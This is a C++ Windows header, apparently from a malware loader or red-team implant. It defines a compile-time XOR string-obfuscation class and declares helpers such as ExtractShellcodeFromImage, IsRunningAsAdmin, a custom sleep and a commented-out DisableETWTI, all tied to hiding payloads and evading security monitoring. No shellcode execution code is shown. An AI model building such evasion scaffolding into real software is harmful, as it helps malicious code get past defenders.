#pragma once
#include <Windows.h>
#include <xstring>
#include <iostream>
#include <string>
#include <gdiplus.h>

#ifndef __wtypes_h__
#include <wtypes.h>
#endif

#ifndef __WINDEF_
#include <windef.h>
#endif

#pragma comment(lib, "gdiplus.lib")


auto charToLPCWSTR(const char* charString) -> LPCWSTR;
auto charToLPSTR(const char* str) -> LPSTR;
auto charToLPWSTR(const char* charString) -> LPWSTR;

auto DebugPrintA(const char* format, ...) -> void;
auto DebugPrintW(const wchar_t* format, ...) -> void;
auto myGetCurrentThreadId() -> DWORD;
auto myGetCurrentProcessId() -> DWORD;
auto AR_getTickcount64() -> ULONG64;
auto _strstri_w(const wchar_t* s, const wchar_t* sub_s) -> wchar_t*;
auto ExtractShellcodeFromImage(LPCWSTR imagePath, PBYTE *shellcode, DWORD *size) -> BOOL;



class StringEncryption {
private:
    static constexpr BYTE key[] = { 0x51, 0x23, 0x97, 0xE8, 0xDC, 0xBA, 0x45, 0x67 };

public:
    template<typename T>
    static constexpr size_t GetLength(const T* str) {
        size_t len = 0;
        while (str[len] != 0) len++;
        return len + 1;
    }

    template<size_t N>
    class EncryptedString {
    private:
        char data[N];
        bool decrypted;

        static void Transform(char* str, size_t len) {
            for (size_t i = 0; i < len; i++) {
                str[i] = str[i] ^ key[i % sizeof(key)] ^ (i & 0xFF);
            }
        }

    public:
        constexpr EncryptedString(const char* str) : data{}, decrypted(false) {
            for (size_t i = 0; i < N; i++) {
                data[i] = str[i] ^ key[i % sizeof(key)] ^ (i & 0xFF);
            }
        }

        operator const char* () {
            if (!decrypted) {
                Transform(data, N);
                decrypted = true;
            }
            return data;
        }
    };

    template<size_t N>
    class EncryptedWString {
    private:
        wchar_t data[N];
        bool decrypted;

        static void Transform(wchar_t* str, size_t len) {
            for (size_t i = 0; i < len; i++) {
                WORD* ptr = reinterpret_cast<WORD*>(&str[i]);
                *ptr = *ptr ^ ((key[i % sizeof(key)] << 8) | key[(i + 1) % sizeof(key)]);
            }
        }

    public:
        constexpr EncryptedWString(const wchar_t* str) : data{}, decrypted(false) {
            for (size_t i = 0; i < N; i++) {
                WORD value = static_cast<WORD>(str[i]);
                value = value ^ ((key[i % sizeof(key)] << 8) | key[(i + 1) % sizeof(key)]);
                data[i] = static_cast<wchar_t>(value);
            }
        }

        operator const wchar_t* () {
            if (!decrypted) {
                Transform(data, N);
                decrypted = true;
            }
            return data;
        }
    };
};

#define ENCRYPT_STR(str) []() -> const char* { \
    static StringEncryption::EncryptedString<StringEncryption::GetLength(str)> encrypted(str); \
    return encrypted; \
}()

#define ENCRYPT_WSTR(str) []() -> const wchar_t* { \
    static StringEncryption::EncryptedWString<StringEncryption::GetLength(L##str)> encrypted(L##str); \
    return encrypted; \
}()


auto WideToUtf8(const std::wstring& wstr) -> std::string;
auto EscapeJsonString(const std::string& input) -> std::string;
auto Base64Decode(const std::string& encoded) -> std::string;
auto custom_sleep(int milliseconds) -> void;
auto IsRunningAsAdmin() -> BOOL;
// auto DisableETWTI() -> BOOLEAN; 